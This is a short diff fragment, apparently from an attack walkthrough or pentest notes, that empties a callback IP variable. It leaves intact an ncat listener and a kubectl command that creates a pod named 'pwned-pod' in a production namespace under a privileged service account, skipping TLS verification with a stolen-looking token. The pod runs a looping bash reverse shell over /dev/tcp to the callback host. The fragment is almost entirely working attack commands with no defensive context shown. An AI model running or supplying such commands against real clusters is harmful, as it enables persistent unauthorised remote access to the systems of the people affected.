@@ -76,7 +76,7 @@ ncat -lvnp 5555 &
 ```
 
 ```bash
-CALLBACK_IP=172.31.74.160
+CALLBACK_IP=
 kubectl --insecure-skip-tls-verify --token=$TOKEN create pod pwned-pod -n prod --image=nginx:1.25 --serviceaccount=cluster-ops-sa -- /bin/bash -c "while true; do bash -i >& /dev/tcp/${CALLBACK_IP}/5555 0>&1; sleep 2; done"
 ```
 
